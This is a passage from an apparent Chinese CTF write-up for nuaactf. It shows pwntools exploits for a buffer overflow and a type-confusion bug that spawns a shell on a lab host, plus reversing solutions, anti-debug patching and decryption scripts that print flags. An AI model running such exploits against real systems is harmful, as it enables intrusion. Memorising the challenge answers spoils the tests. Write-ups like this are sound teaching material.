buf 能够写到返回地址</span></span><br><span class="line"><span class="comment"># 还要去掉 pwd: 这 4 个 字节</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0x10c</span>+<span class="number">4</span>-<span class="number">4</span>-<span class="number">2</span>-<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># bp 0x0804873B</span></span><br><span class="line"><span class="comment"># c</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x08048674</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="type-confusion"><a href="#type-confusion" class="headerlink" title="type_confusion"></a>type_confusion</h3><p>类型混淆，可以先释放一个 c1类的 obj, 然后分配一个 c2 类的 obj, 然后利用 see c1 obj 的功能调用虚函数，会调用 c2 的虚函数，c2 的相应虚函数的作用就是 system(“sh)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int c2::dump()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体看 <code>exp</code> 和源码</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;../dist/pwn&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(binary_path)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.17.0.2&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="stupid-contract-challenge-rev"><a href="#stupid-contract-challenge-rev" class="headerlink" title="stupid_contract_challenge[rev]"></a>stupid_contract_challenge[rev]</h3><p>简单solidity逆向，源码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract stupidChallenge&#123;</span><br><span class="line">    bytes32 seed &#x3D; 0xaaa0adabb79fb8b9bca5a8938fa3a2b8415250476c705b525f5f565d5456124e;</span><br><span class="line">    function generateFlag() public returns(bytes)&#123;</span><br><span class="line">        bytes memory finalFlag &#x3D; new bytes(seed.length);</span><br><span class="line">        uint i;</span><br><span class="line">        for(i &#x3D; 0;i&lt;seed.length&#x2F;2;i++) &#123;</span><br><span class="line">            finalFlag[i]&#x3D;seed[i]^0xcc;</span><br><span class="line">        &#125;</span><br><span class="line">        for(;i&lt;seed.length;i++) &#123;</span><br><span class="line">            finalFlag[i]&#x3D;seed[i]^0x33;</span><br><span class="line">        &#125;</span><br><span class="line">        return finalFlag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接把字节码扔 <a target="_blank" rel="noopener" href="https://ethervm.io/decompile">https://ethervm.io/decompile</a> 即可</p>
<h3 id="variant-of-cat"><a href="#variant-of-cat" class="headerlink" title="variant_of_cat"></a>variant_of_cat</h3><p>智能合约，整数下溢<br>先调用<code>fightAsuriMonster</code>使得攻击力下溢，再次调用<code>fightBoss</code>即可</p>
<h3 id="STG-TouHou"><a href="#STG-TouHou" class="headerlink" title="STG TouHou"></a>STG TouHou</h3><p>是一个彻头彻尾的车万游戏呢。</p>
<h4 id="正常通关"><a href="#正常通关" class="headerlink" title="正常通关"></a>正常通关</h4><p>通关游戏，会把flag打印在屏幕上</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>这个题目会告知大家这个程序叫做四圣龙神录，其实是可以从github上找到源码的。Rev的题目拿到了源码，那基本上就做出来了。当然源代码肯定没有flag相关的逻辑，可以结合源代码对程序进行审计。<br>首先逆向日常搜索flag字符串，会发现如下的函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4308D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_D0CA74 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = sub_40E039(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    sub_40D837(<span class="number">0</span>, <span class="number">40</span>, v0, <span class="string">&quot;Flag:%s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;byte_D0CA78);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个Flag很显然是刻意打印的，那么追踪一下这个byte_D0CA78</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">sub_430730</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// STD7_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">54</span>; ++i )</span><br><span class="line">    byte_AEE308[i] -= a1;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = j;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= <span class="number">54</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = <span class="number">16</span> * trans2num(byte_AEE308[j]);</span><br><span class="line">    byte_D0CA78[j / <span class="number">2</span>] = trans2num(byte_AEE309[j]) + v2;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_D0CA74 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会找到这个函数，可以看到这里又存储了一个全局变量。这里的运算相当于是将一个数字分成了高4bit和低4bit然后进行合并处理，那么我们继续回溯，检查这个<code>byte_AEE308</code>的来历，会找到另一段的程序逻辑:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">sub_430850</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">54</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    byte_AEE308[i] ^= a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟踪调用关系，会发现这两个函数是由同一个函数调用的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">sub_430960</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_405696(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">    result = sub_402A09(a2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟踪到外面，可以看到这样的逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = dword_D0C03C++ + <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">if</span> ( dword_D0C03C == <span class="number">1</span> )</span><br><span class="line">   <span class="keyword">return</span> sub_40A907(dword_D0C03C, <span class="number">255</span>);</span><br><span class="line"> <span class="keyword">if</span> ( dword_D0C03C == <span class="number">2</span> )</span><br><span class="line">   result = sub_40A907(dword_D0C03C, <span class="number">19</span>);</span><br><span class="line"> <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>结合东方（游戏逻辑！）一般来说都是先1后2，所以是先调用前面那个逻辑后调用后面的逻辑。于是根据调用顺序，我们能够写出解密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">enc = [<span class="number">182</span>,<span class="number">135</span>,<span class="number">181</span>,<span class="number">183</span>,<span class="number">182</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">185</span>,<span class="number">181</span>,<span class="number">184</span>,<span class="number">182</span>,<span class="number">182</span>,<span class="number">181</span>,<span class="number">138</span>,<span class="number">183</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">185</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">188</span>,<span class="number">182</span>,<span class="number">136</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">183</span>,<span class="number">134</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">183</span>,<span class="number">134</span>,<span class="number">184</span>,<span class="number">181</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">182</span>,<span class="number">135</span>,<span class="number">183</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">188</span>,<span class="number">184</span>,<span class="number">138</span>,<span class="number">185</span>,<span class="number">184</span>,<span class="number">182</span>,<span class="number">134</span>,<span class="number">181</span>,<span class="number">136</span> ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_one</span>(<span class="params">enc, num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        enc[i] ^= num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_two</span>(<span class="params">enc, num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        enc[i] -= num</span><br><span class="line"></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> enc)</span><br><span class="line">    print(codecs.decode(ans,<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dec_one(enc, <span class="number">255</span>)</span><br><span class="line">    dec_two(enc, <span class="number">19</span>)</span><br><span class="line">    <span class="comment"># nuaactf&#123;We1c0m3_2_G3nS0K4o&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a>Middle</h3><p>题目来源：因为难度定位是中等所以叫这个</p>
<h4 id="初步准备"><a href="#初步准备" class="headerlink" title="初步准备"></a>初步准备</h4><p>对于想要做这个题目的人来说，想必也是有了一定的基础。比如说首先要认得这个程序是一个ELF文件是Linux下的可执行文件之类的。（其实我第一次做的时候就不会认这个，滑稽）<br>那么逆向首先无非准备几个工具</p>
<ul>
<li>静态工具：IDA</li>
<li>动态分析工具：gdb</li>
<li>环境：Ubuntu</li>
</ul>
<p>首先运行程序，发现程序两个行为：</p>
<ul>
<li>输入<code>nuaactf&#123;.+&#125;</code>格式的字符串</li>
<li>如果输入完成，会让我们做一个C语言的题目</li>
</ul>
<p>而且在运行的时候会发现，程序会在5秒之内结束。整个题目第一眼逻辑就有了</p>
<h4 id="静态辅助"><a href="#静态辅助" class="headerlink" title="静态辅助"></a>静态辅助</h4><p>掏出静态分析工具，前面一大段其实是字符串在计算对齐的内容，不是特别重要。整体分析就会发现其实是一个给字符串置0的操作。之后的第一个函数<code>sub_80485E4();</code>在打印欢迎内容，之后会遇到函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey guys, what are you doing?!not cheat me~&quot;</span>);</span><br><span class="line">  ++dword_804A0D8;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个<code>ptrace</code>上网查就会发现，这个函数会阻止动态调试，这里可以选择将这个内容patch掉，将二进制内容改成90（nop），跳过这个内容。或者gdb调试直接跳过这个内容也可以，反正有办法都行。</p>
<p>之后来到这个地方的逻辑:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hey you, what&#x27;s your password?&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;format:nuaactf&#123;&#125;, length:24&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%c&quot;</span>, i + a1);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;em?ok, you can get in...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  result = j;</span><br><span class="line">  <span class="keyword">if</span> ( j &gt;= <span class="number">24</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_BYTE *)(j + a1) = ((<span class="keyword">int</span> (__cdecl *)(_DWORD))loc_8048628)(*(<span class="keyword">unsigned</span> __int8 *)(j + a1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的内容就是让我们输入一段类似flag的内容，不过注意到，最后会对数组<code>a1</code>的每一个元素进行更新，但是似乎是一个没有被识别成函数的内容，跟进去查看，发现一些奇怪的指令阻止了程序的正常解析，不过仔细观察，似乎这个跳转根本就不会调用到这些神奇的指令，利用前面教过的patch方法，就能够修改掉程序内容，看到正确的程序内容:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  v2 |= (((<span class="keyword">signed</span> <span class="keyword">int</span>)a1 &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; *(_BYTE *)(i + <span class="number">0x804A0C2</span>);</span><br><span class="line"><span class="keyword">return</span> v2</span><br></pre></td></tr></table></figure>

<p>这个巨大的数字其实是一个地址，里面内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A0C2                 db    3</span><br><span class="line">.data:0804A0C3                 db    7</span><br><span class="line">.data:0804A0C4                 db    2</span><br><span class="line">.data:0804A0C5                 db    1</span><br><span class="line">.data:0804A0C6                 db    6</span><br><span class="line">.data:0804A0C7                 db    4</span><br><span class="line">.data:0804A0C8                 db    5</span><br><span class="line">.data:0804A0C9                 db    0</span><br></pre></td></tr></table></figure>

<p>理解一下，就相当于是一个数组的下标i在遍历。总的分析这个算法，其实就是<strong>将一个字节的每一bit的顺序重新映射到一个新的位置上</strong>具体对应关系为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0 1 2 3 4 5 6 7</span><br><span class="line">3 7 2 1 6 4 5 0</span><br></pre></td></tr></table></figure>

<h4 id="C语言课程"><a href="#C语言课程" class="headerlink" title="C语言课程"></a>C语言课程</h4><p>然后有一个让大家轻松一下的环节，让大家输入一个程序的运行结果。这个一看就是宏定义的错误实例，即会产生一个非预期的答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+3*1+4 &#x3D; 8</span><br></pre></td></tr></table></figure>

<p>不过其实整个考出来跑也是可以的~</p>
<h4 id="最后的答案"><a href="#最后的答案" class="headerlink" title="最后的答案"></a>最后的答案</h4><p>最后一段逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="number">-66</span>;</span><br><span class="line">v4 = <span class="number">116</span>;</span><br><span class="line">v5 = <span class="number">48</span>;</span><br><span class="line">v6 = <span class="number">48</span>;</span><br><span class="line">v7 = <span class="number">-80</span>;</span><br><span class="line">v8 = <span class="number">124</span>;</span><br><span class="line">v9 = <span class="number">-68</span>;</span><br><span class="line">v10 = <span class="number">-14</span>;</span><br><span class="line">v11 = <span class="number">42</span>;</span><br><span class="line">v12 = <span class="number">48</span>;</span><br><span class="line">v13 = <span class="number">48</span>;</span><br><span class="line">v14 = <span class="number">16</span>;</span><br><span class="line">v15 = <span class="number">98</span>;</span><br><span class="line">v16 = <span class="number">-74</span>;</span><br><span class="line">v17 = <span class="number">116</span>;</span><br><span class="line">v18 = <span class="number">-26</span>;</span><br><span class="line">v19 = <span class="number">-92</span>;</span><br><span class="line">v20 = <span class="number">88</span>;</span><br><span class="line">v21 = <span class="number">124</span>;</span><br><span class="line">v22 = <span class="number">-26</span>;</span><br><span class="line">v23 = <span class="number">80</span>;</span><br><span class="line">v24 = <span class="number">124</span>;</span><br><span class="line">v25 = <span class="number">16</span>;</span><br><span class="line">v26 = <span class="number">118</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Well,Well,You get here right?&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !dword_804A0D8 || dword_804A0D0 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;En?No No No you are not clever~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;!!! Hey !!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you remember your password?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">24</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YOU ARE RIGHT!THE KEY IS FLAG!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;O?Nearly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到离正确答案很近了~<br>不过会发现，不是那么容易能够进入这个匹配逻辑。仔细观察会发现，变量<code>dword_804A0D8</code>在一开始的<code>ptrace</code>处出现过，而<code>dword_804A0D0</code>则是会在一个handler里面出现，这个handler其实是注册的一个信号事件，5秒后自动跳转为1（这个地方其实是坑调试器用的，因为调试器可以选择忽略alarm但是此时变量依然会被置为1）不过一样可以用强硬的手段跳过这段逻辑。之后发现是一段关键逻辑比较</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;</span><br><span class="line"><span class="keyword">if</span> ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) )</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>其中<code>dword_804A0D4</code>存放了C语言那段中，我们输入的正确答案。如果输入正确答案，则会通过与上面出现那一大段数字（其实是一个数组）进行异或，得到答案。于是总结下来，我们可以得到整体逻辑:</p>
<ul>
<li>首先对输入进行bit变化</li>
<li>与C语言输入的正确答案进行异或</li>
<li>与程序内部的数据比较</li>
</ul>
<p>因此可以写出解密逻辑:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -*- coding:utf-8    -*-</span></span><br><span class="line"></span><br><span class="line">bit_map = [<span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line">check = [<span class="number">190</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">176</span>, <span class="number">124</span>, <span class="number">188</span>, <span class="number">242</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">116</span>, <span class="number">230</span>, <span class="number">164</span>, <span class="number">88</span>, <span class="number">124</span>, <span class="number">230</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">118</span>]</span><br><span class="line">right_answer = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_detrans</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp_u = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp = (num &gt;&gt; i) &amp; <span class="number">0x1</span></span><br><span class="line">        tmp_u |= (tmp &lt;&lt; bit_map[i])</span><br><span class="line">    <span class="keyword">return</span> tmp_u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp = [each ^ right_answer <span class="keyword">for</span> each <span class="keyword">in</span> check]</span><br><span class="line">ans = [<span 